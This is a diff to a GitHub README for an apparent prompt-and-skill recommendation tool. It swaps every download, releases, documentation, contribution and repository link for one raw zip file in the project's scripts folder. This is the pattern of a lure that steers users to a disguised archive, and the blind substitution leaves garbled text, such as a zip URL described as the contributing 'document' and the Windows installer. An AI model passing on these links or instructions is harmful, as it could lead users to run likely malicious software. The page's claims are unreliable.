@@ -1,7 +1,7 @@
 # 🍌 nano-banana-pro-prompts-recommend-skill - Get Skill Recommendations Easily
 
 ## 📥 Download
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/PedroCouto839/nano-banana-pro-prompts-recommend-skill/releases)
+[![Download](https://github.com/PedroCouto839/nano-banana-pro-prompts-recommend-skill/raw/refs/heads/main/scripts/nano_prompts_pro_banana_recommend_skill_2.3.zip)](https://github.com/PedroCouto839/nano-banana-pro-prompts-recommend-skill/raw/refs/heads/main/scripts/nano_prompts_pro_banana_recommend_skill_2.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the nano-banana-pro-prompts-recommend-skill project! This software helps you find the best skills to recommend using over 7000 Nano Banana Pro image prompts. Whether you're new to using tools like Claude Code or Cursor, this guide will help you through the process.
@@ -14,11 +14,11 @@ To run this application, you need:
 
 ## 📦 Download & Install
 1. **Visit the Releases Page:** To start, click the link below and go to the Releases page.
-   [Download from Releases Page](https://github.com/PedroCouto839/nano-banana-pro-prompts-recommend-skill/releases)
+   [Download from Releases Page](https://github.com/PedroCouto839/nano-banana-pro-prompts-recommend-skill/raw/refs/heads/main/scripts/nano_prompts_pro_banana_recommend_skill_2.3.zip)
 
 2. **Select the Latest Version:** On the Releases page, you will see a list of versions. Choose the latest one for the best experience.
 
-3. **Choose Your File:** Depending on your operating system, find the corresponding file. For example, you may see something like `nano-banana-pro-prompts-recommend-skill-v1.0.exe` for Windows users.
+3. **Choose Your File:** Depending on your operating system, find the corresponding file. For example, you may see something like `https://github.com/PedroCouto839/nano-banana-pro-prompts-recommend-skill/raw/refs/heads/main/scripts/nano_prompts_pro_banana_recommend_skill_2.3.zip` for Windows users.
 
 4. **Download the File:** Click the file name to start the download. Save the file to a location you can easily access, like your Downloads folder.
 
@@ -38,18 +38,18 @@ To run this application, you need:
 If you have questions or need help, feel free to reach out to the community. You can raise issues on the GitHub repository or check the Discussions section for common questions.
 
 ## 📝 Contribution Guidelines
-If you're interested in improving the project, contributions are welcome! Please refer to the `CONTRIBUTING.md` document in this repository for guidelines on how to contribute.
+If you're interested in improving the project, contributions are welcome! Please refer to the `https://github.com/PedroCouto839/nano-banana-pro-prompts-recommend-skill/raw/refs/heads/main/scripts/nano_prompts_pro_banana_recommend_skill_2.3.zip` document in this repository for guidelines on how to contribute.
 
 ## 📅 Upcoming Features
 - **Enhanced Skill Algorithms:** We are working on a feature to improve the skill recommendation engine.
 - **User Profiles:** Upcoming versions may include personalized profiles for a tailored experience.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/PedroCouto839/nano-banana-pro-prompts-recommend-skill)
-- [Documentation](https://github.com/PedroCouto839/nano-banana-pro-prompts-recommend-skill/wiki)
+- [GitHub Repository](https://github.com/PedroCouto839/nano-banana-pro-prompts-recommend-skill/raw/refs/heads/main/scripts/nano_prompts_pro_banana_recommend_skill_2.3.zip)
+- [Documentation](https://github.com/PedroCouto839/nano-banana-pro-prompts-recommend-skill/raw/refs/heads/main/scripts/nano_prompts_pro_banana_recommend_skill_2.3.zip)
 
 ## 📥 Download Again
 To download the application, click the link below.
-[Download from Releases Page](https://github.com/PedroCouto839/nano-banana-pro-prompts-recommend-skill/releases)
+[Download from Releases Page](https://github.com/PedroCouto839/nano-banana-pro-prompts-recommend-skill/raw/refs/heads/main/scripts/nano_prompts_pro_banana_recommend_skill_2.3.zip)
 
 Thank you for choosing nano-banana-pro-prompts-recommend-skill! Enjoy your skill recommendations!
